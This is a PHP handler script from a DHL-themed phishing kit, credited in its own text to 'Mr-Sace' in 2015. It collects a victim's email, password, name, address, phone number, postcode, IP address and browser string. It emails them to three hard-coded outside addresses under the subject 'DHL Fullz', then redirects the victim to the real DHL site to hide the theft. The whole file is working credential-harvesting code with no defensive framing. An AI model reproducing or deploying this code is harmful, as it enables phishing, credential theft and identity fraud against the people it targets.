<?php
session_start();
$email = $_SESSION['email'];
$epass = $_SESSION['epass'];

$ip = getenv("REMOTE_ADDR");
$browser = $_SERVER['HTTP_USER_AGENT'];
$adddate=date("D M d, Y g:i a");
$fullname = $_POST['fullname'];
$address = $_POST['address'];
$phonenumber = $_POST['phonenumber'];
$postcode = $_POST['postcode'];

$phonechk = strlen($phonenumber);
$message .= "--------+ DHL Wire ReZulT +--------\n";
$message .= "Email : ".$_SESSION['email']."\n";
$message .= "Password : ".$_SESSION['epass']."\n";
$message .= "Full Name : ".$_POST['fullname']."\n";
$message .= "Address : ".$_POST['address']."\n";
$message .= "Phone Number : ".$_POST['phonenumber']."\n";
$message .= "Post Code : ".$_POST['postcode']."\n";
$message .= "-----------------------------------\n";
$message .= "User Agent : ".$browser."\n";
$message .= "Client IP : ".$ip."\n";
$message .= "Date: ".$adddate."\n";
$message .= "--+ Created BY Mr-Sace in 2015 +---\n";

$send = "tools.jaiye@yandex.com,brenda.eyers2@outlook.com,toolfoundation@excite.com";

$subject = "DHL Fullz | $email";
$headers .= "MIME-Version: 1.0\n";
$headers .= $_POST['eMailAdd']."\n";

mail($send,$subject,$message,$headers);
header("Location: https://www.google.ru/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&uact=8&ved=0ahUKEwiflJC16sPZAhXQGuwKHR7_CFoQFggrMAA&url=http%3A%2F%2Fwww.dhl.com%2Fen.html&usg=AOvVaw27XYLx5105YMIeFbVEFlxr");
die;

